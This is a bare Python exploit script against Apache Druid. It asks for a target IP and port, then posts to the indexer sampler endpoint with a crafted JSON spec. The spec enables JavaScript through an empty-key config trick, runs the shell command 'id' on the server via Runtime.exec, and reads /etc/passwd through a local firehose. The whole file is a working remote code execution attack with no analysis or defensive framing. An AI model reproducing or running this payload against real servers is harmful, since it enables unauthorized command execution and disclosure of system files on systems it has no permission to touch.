import requests

# Function to get IP address and port from user input
def get_ip_and_port():
    ip = input("Enter the IP address: ")
    port = input("Enter the port: ")
    return ip, port

# Get IP address and port from user input
ip_address, port = get_ip_and_port()

# Construct the URL
url = f'http://{ip_address}:{port}/druid/indexer/v1/sampler'

# Headers and data remain the same as before
headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en-US;q=0.9,en;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36',
    'Connection': 'close',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/json'
}

data = {
    "type": "index",
    "spec": {
        "ioConfig": {
            "type": "index",
            "firehose": {
                "type": "local",
                "baseDir": "/etc",
                "filter": "passwd"
            }
        },
        "dataSchema": {
            "dataSource": "test",
            "parser": {
                "parseSpec": {
                    "format": "javascript",
                    "timestampSpec": {},
                    "dimensionsSpec": {},
                    "function": "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                    "": {
                        "enabled": "true"
                    }
                }
            }
        }
    },
    "samplerConfig": {
        "numRows": 10
    }
}

response = requests.post(url, headers=headers, json=data)

if response.status_code == 200:
    print("Request successful.")
    print("Response:")
    print(response.json())
else:
    print("Request failed with status code:", response.status_code)
    print("Response:")
    print(response.text)
